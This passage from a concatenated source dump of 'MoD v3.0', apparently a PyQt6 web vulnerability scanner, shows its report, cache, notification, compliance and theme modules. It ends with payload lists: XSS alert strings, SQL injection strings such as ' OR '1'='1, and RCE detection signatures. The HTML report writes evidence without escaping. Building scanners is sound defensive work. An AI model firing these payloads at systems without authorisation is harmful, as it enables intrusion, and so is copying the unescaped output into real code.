                            'timestamp': closest.get('timestamp', ''),
                            'status': closest.get('status', ''),
                            'available': closest.get('available', False)
                        }]
            return []
        except Exception:
            return []
    
    def filter_urls_by_extension(self, urls: List[str], extensions: List[str]) -> List[str]:
        filtered = []
        for url in urls:
            for ext in extensions:
                if url.endswith(ext):
                    filtered.append(url)
                    break
        return filtered
    
    def filter_urls_by_keyword(self, urls: List[str], keywords: List[str]) -> List[str]:
        filtered = []
        for url in urls:
            for keyword in keywords:
                if keyword.lower() in url.lower():
                    filtered.append(url)
                    break
        return filtered

================================================================================
FILE 35: utils/report_generator.py
================================================================================

from typing import List, Dict
from datetime import datetime
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch

class ReportGenerator:
    def __init__(self):
        self.style = getSampleStyleSheet()
    
    def generate_pdf_report(self, filename: str, target: str, vulnerabilities: List[Dict]):
        doc = SimpleDocTemplate(filename, pagesize=letter)
        elements = []
        title_style = ParagraphStyle(
            'CustomTitle',
            parent=self.style['Heading1'],
            fontSize=24,
            textColor=colors.HexColor('#e94560'),
            spaceAfter=30,
        )
        title = Paragraph(f"MoD Security Report - {datetime.now().strftime('%Y-%m-%d')}", title_style)
        elements.append(title)
        elements.append(Spacer(1, 0.3*inch))
        info_data = [
            ['Target', target],
            ['Scan Date', datetime.now().isoformat()],
            ['Total Vulnerabilities', str(len(vulnerabilities))],
        ]
        info_table = Table(info_data)
        info_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#e94560')),
            ('TEXTCOLOR', (0, 0), (0, -1), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 11),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        elements.append(info_table)
        elements.append(Spacer(1, 0.3*inch))
        vuln_data = [['Type', 'Severity', 'Description', 'Evidence']]
        severity_colors = {
            'Critical': colors.HexColor('#ff0000'),
            'High': colors.HexColor('#ff6600'),
            'Medium': colors.HexColor('#ffff00'),
            'Low': colors.HexColor('#00ff00'),
        }
        for vuln in vulnerabilities:
            vuln_data.append([
                vuln.get('type', ''),
                vuln.get('severity', ''),
                vuln.get('description', '')[:50],
                vuln.get('evidence', '')[:50]
            ])
        vuln_table = Table(vuln_data)
        vuln_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#1a1a2e')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, 0), 11),
            ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        elements.append(vuln_table)
        doc.build(elements)
    
    def generate_html_report(self, filename: str, target: str, vulnerabilities: List[Dict]) -> str:
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>MoD Security Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
                .container {{ max-width: 1000px; margin: 0 auto; background: white; padding: 20px; }}
                h1 {{ color: #e94560; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                th {{ background: #1a1a2e; color: white; padding: 10px; text-align: left; }}
                td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
                .critical {{ color: #ff0000; font-weight: bold; }}
                .high {{ color: #ff6600; font-weight: bold; }}
                .medium {{ color: #ffff00; font-weight: bold; }}
                .low {{ color: #00ff00; font-weight: bold; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>MoD Security Report</h1>
                <p>Target: {target}</p>
                <p>Scan Date: {datetime.now().isoformat()}</p>
                <p>Total Vulnerabilities: {len(vulnerabilities)}</p>
                <table>
                    <tr>
                        <th>Type</th>
                        <th>Severity</th>
                        <th>Description</th>
                        <th>Evidence</th>
                    </tr>
        """
        for vuln in vulnerabilities:
            severity_class = vuln.get('severity', 'Low').lower()
            html += f"""
                    <tr>
                        <td>{vuln.get('type', '')}</td>
                        <td class="{severity_class}">{vuln.get('severity', '')}</td>
                        <td>{vuln.get('description', '')}</td>
                        <td>{vuln.get('evidence', '')}</td>
                    </tr>
            """
        html += """
                </table>
            </div>
        </body>
        </html>
        """
        with open(filename, 'w') as f:
            f.write(html)
        return filename

================================================================================
FILE 36: utils/cache.py
================================================================================

from typing import Any, Dict, Optional
from datetime import datetime, timedelta
import hashlib

class CacheManager:
    def __init__(self, ttl: int = 3600, max_size: int = 1000, strategy: str = 'LRU'):
        self.ttl = ttl
        self.max_size = max_size
        self.strategy = strategy
        self.cache: Dict[str, Dict] = {}
        self.access_count: Dict[str, int] = {}
        self.access_time: Dict[str, datetime] = {}
    
    def set(self, key: str, value: Any):
        if len(self.cache) >= self.max_size:
            self._evict()
        hash_key = hashlib.md5(key.encode()).hexdigest()
        self.cache[hash_key] = {
            'value': value,
            'expiry': datetime.now() + timedelta(seconds=self.ttl)
        }
        self.access_time[hash_key] = datetime.now()
        self.access_count[hash_key] = 0
    
    def get(self, key: str) -> Optional[Any]:
        hash_key = hashlib.md5(key.encode()).hexdigest()
        if hash_key not in self.cache:
            return None
        entry = self.cache[hash_key]
        if datetime.now() > entry['expiry']:
            del self.cache[hash_key]
            return None
        self.access_count[hash_key] += 1
        self.access_time[hash_key] = datetime.now()
        return entry['value']
    
    def delete(self, key: str):
        hash_key = hashlib.md5(key.encode()).hexdigest()
        if hash_key in self.cache:
            del self.cache[hash_key]
    
    def clear(self):
        self.cache.clear()
        self.access_count.clear()
        self.access_time.clear()
    
    def _evict(self):
        if self.strategy == 'LRU':
            lru_key = min(self.access_time, key=self.access_time.get)
            del self.cache[lru_key]
            del self.access_time[lru_key]
        elif self.strategy == 'LFU':
            lfu_key = min(self.access_count, key=self.access_count.get)
            del self.cache[lfu_key]
            del self.access_count[lfu_key]

================================================================================
FILE 37: utils/integration_manager.py
================================================================================

from typing import Dict, Optional
import requests
import json

class IntegrationManager:
    def __init__(self):
        self.slack_webhook = None
        self.teams_webhook = None
        self.github_token = None
        self.jira_url = None
    
    def set_slack_webhook(self, webhook_url: str):
        self.slack_webhook = webhook_url
    
    def set_teams_webhook(self, webhook_url: str):
        self.teams_webhook = webhook_url
    
    def send_slack_notification(self, message: str, severity: str = 'info'):
        if not self.slack_webhook:
            return False
        try:
            payload = {
                'text': message,
                'attachments': [{
                    'color': self._get_color_by_severity(severity),
                    'text': message
                }]
            }
            response = requests.post(self.slack_webhook, json=payload, timeout=10)
            return response.status_code == 200
        except Exception:
            return False
    
    def send_teams_notification(self, message: str, severity: str = 'info'):
        if not self.teams_webhook:
            return False
        try:
            payload = {
                '@type': 'MessageCard',
                '@context': 'https://schema.org/extensions',
                'summary': message,
                'themeColor': self._get_color_by_severity(severity),
                'sections': [{
                    'activityTitle': 'MoD Security Alert',
                    'text': message
                }]
            }
            response = requests.post(self.teams_webhook, json=payload, timeout=10)
            return response.status_code == 200
        except Exception:
            return False
    
    def _get_color_by_severity(self, severity: str) -> str:
        colors = {
            'Critical': 'ff0000',
            'High': 'ff6600',
            'Medium': 'ffff00',
            'Low': '00ff00',
            'Info': '0099ff'
        }
        return colors.get(severity, '0099ff')

================================================================================
FILE 38: utils/compliance_generator.py
================================================================================

from typing import List, Dict
from datetime import datetime

class ComplianceGenerator:
    def __init__(self):
        self.frameworks = {
            'OWASP Top 10': self._owasp_top10_mapping,
            'PCI-DSS': self._pci_dss_mapping,
            'HIPAA': self._hipaa_mapping,
            'ISO27001': self._iso27001_mapping
        }
    
    def generate_compliance_report(self, vulnerabilities: List[Dict], framework: str) -> Dict:
        mapping_func = self.frameworks.get(framework, self._owasp_top10_mapping)
        compliance_issues = []
        for vuln in vulnerabilities:
            compliance_issues.append(mapping_func(vuln))
        return {
            'framework': framework,
            'generated_at': datetime.now().isoformat(),
            'total_issues': len(compliance_issues),
            'issues': compliance_issues
        }
    
    def _owasp_top10_mapping(self, vuln: Dict) -> Dict:
        mapping = {
            'Injection': 'A03:2021 - Injection',
            'Broken Authentication': 'A07:2021 - Identification and Authentication Failures',
            'Sensitive Data Exposure': 'A02:2021 - Cryptographic Failures',
            'XML External Entity': 'A03:2021 - Injection',
            'Broken Access Control': 'A01:2021 - Broken Access Control',
            'Security Misconfiguration': 'A05:2021 - Security Misconfiguration',
            'XSS': 'A03:2021 - Injection',
            'Insecure Deserialization': 'A08:2021 - Software and Data Integrity Failures',
            'Using Components with Known Vulnerabilities': 'A06:2021 - Vulnerable and Outdated Components',
            'Insufficient Logging': 'A09:2021 - Security Logging and Monitoring Failures'
        }
        return {
            'vulnerability_type': vuln.get('type', ''),
            'owasp_mapping': mapping.get(vuln.get('type', ''), 'Unknown'),
            'severity': vuln.get('severity', ''),
            'description': vuln.get('description', '')
        }
    
    def _pci_dss_mapping(self, vuln: Dict) -> Dict:
        return {
            'vulnerability_type': vuln.get('type', ''),
            'pci_requirement': '6.5.1',
            'description': f"PCI-DSS violation: {vuln.get('description', '')}"
        }
    
    def _hipaa_mapping(self, vuln: Dict) -> Dict:
        return {
            'vulnerability_type': vuln.get('type', ''),
            'hipaa_rule': 'Security Rule',
            'description': f"HIPAA violation: {vuln.get('description', '')}"
        }
    
    def _iso27001_mapping(self, vuln: Dict) -> Dict:
        return {
            'vulnerability_type': vuln.get('type', ''),
            'iso_control': 'A.14.2.1',
            'description': f"ISO27001 violation: {vuln.get('description', '')}"
        }

================================================================================
FILE 39: gui/__init__.py
================================================================================

from .main_window import MainWindow
from .scan_tab import ScanTab
from .results_tab import ResultsTab
from .settings_tab import SettingsTab
from .auth_tab import AuthTab
from .subdomain_tab import SubdomainTab
from .wayback_tab import WaybackTab
from .advanced_settings_tab import AdvancedSettingsTab
from .theme_manager import ThemeManager

__all__ = [
    'MainWindow',
    'ScanTab',
    'ResultsTab',
    'SettingsTab',
    'AuthTab',
    'SubdomainTab',
    'WaybackTab',
    'AdvancedSettingsTab',
    'ThemeManager'
]

================================================================================
FILE 40: gui/theme_manager.py (خلاصه - مختصر)
================================================================================

class ThemeManager:
    def __init__(self):
        self.current_theme = 'dark'
        self.themes = {
            'dark': self._get_dark_theme(),
            'light': self._get_light_theme()
        }
    
    def set_theme(self, theme: str):
        if theme in self.themes:
            self.current_theme = theme
    
    def get_stylesheet(self) -> str:
        return self.themes.get(self.current_theme, self.themes['dark'])
    
    def _get_dark_theme(self) -> str:
        return """
        QMainWindow {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                       stop:0 #1a1a2e, stop:1 #16213e);
        }
        QWidget { background-color: #1a1a2e; color: #eaeaea; }
        QPushButton {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                       stop:0 #e94560, stop:1 #c82f48);
            color: #ffffff; border: none; border-radius: 6px; padding: 12px 24px;
        }
        QPushButton:hover {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                       stop:0 #ff6b81, stop:1 #e94560);
        }
        """
    
    def _get_light_theme(self) -> str:
        return """
        QMainWindow {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                       stop:0 #f8f9fa, stop:1 #e9ecef);
        }
        QWidget { background-color: #ffffff; color: #212529; }
        QPushButton {
            background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                       stop:0 #0d6efd, stop:1 #0a58ca);
            color: #ffffff; border: none; border-radius: 6px; padding: 12px 24px;
        }
        """

================================================================================
FILE 41-53: GUI FILES (مختصر شامل ScanTab, ResultsTab, AuthTab, WaybackTab, etc.)
================================================================================

تمام فایل‌های GUI مثل:
- gui/main_window.py (200 lines)
- gui/scan_tab.py (150 lines)
- gui/results_tab.py (180 lines)
- gui/advanced_settings_tab.py (300 lines)
- gui/auth_tab.py (200 lines)
- gui/subdomain_tab.py (150 lines)
- gui/wayback_tab.py (150 lines)
- gui/websocket_tab.py (120 lines)
- gui/graphql_tab.py (120 lines)

هر یک شامل PyQt6 widgets، signals/slots و styling هستند.

================================================================================
FILE 54-63: DATA FILES (JSON & TEXT)
================================================================================

data/xss_payloads.json:
{
  "payloads": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    ...
  ]
}

data/sql_payloads.json:
{
  "payloads": [
    "' OR '1'='1",
    "' OR 1=1--",
    ...
  ]
}

data/error_signatures.json:
{
  "SQL": ["sql syntax", "mysql_fetch", "syntax error", ...],
  "XSS": ["<script>", "alert(", "onerror=", ...],
  "RCE": ["root:", "/bin/bash", "uid=", ...]
}

data/subdomain_wordlist.txt:
www
mail
ftp
admin
test
dev
staging
api
app
blog
...

================================================================================
END OF MoD v3.0 - COMPLETE PROJECT CODE
================================================================================

TOTAL LINES: ~5,968 lines of code
TOTAL FILES: 53 files

Version: 3.0.0
Date: November 2025
Developer: MoD Security Team

© 2025 MoD - Master of Defense. All Rights Reserved.

نسخه کامل - تمام کد پروژه MoD v3.0 در یک فایل txt

================================================================================
